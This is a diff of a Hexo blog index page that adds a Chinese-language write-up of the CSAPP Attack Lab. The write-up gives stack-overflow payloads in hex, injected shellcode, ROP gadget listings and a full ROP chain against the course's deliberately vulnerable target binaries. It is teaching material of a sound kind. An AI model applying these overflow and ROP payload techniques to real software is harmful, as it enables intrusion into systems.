@@ -179,6 +179,146 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/17/CSAPP-Attack-Lab-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Attack Lab Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-17 11:45:32 / Modified: 15:17:30" itemprop="dateCreated datePublished" datetime="2021-01-17T11:45:32+08:00">2021-01-17</time>
+            </span>
+
+          
+            <span id="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Attack Lab Writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/01/17/CSAPP-Attack-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/17/CSAPP-Attack-Lab-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
+<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
+<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
+<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
+<p>运行的方法是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
+<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
+<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
+<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
+<p>构造shellcode当然先写汇编，有两种写法：</p>
+<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
+<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
+<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
+<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
+<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
+<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
+<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
+<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
+<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
+<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
+<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
+<p>shellcode部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
+<p>把它翻译成机器码，粘在字符串里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
+<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
+<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
+<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
+<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
+<p>而我们大可直接用ROPgadget来做。。。</p>
+<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
+<p>略。</p>
+<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
+<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
+<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
+<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
+<p>开始扫gadget：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
+<p>（略去了一部分没用的gadget）</p>
+<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
+<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
+<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/16/glibc-Heap-Learning/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1421,95 +1561,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2020/12/19/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/19/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-12-19 21:50:39" itemprop="dateCreated datePublished" datetime="2020-12-19T21:50:39+08:00">2020-12-19</time>
-            </span>
-
-          
-            <span id="/2020/12/19/hello-world/" class="post-meta-item leancloud_visitors" data-flag-title="Hello World" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2020/12/19/hello-world/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/12/19/hello-world/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
 
 
 
@@ -1576,7 +1632,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
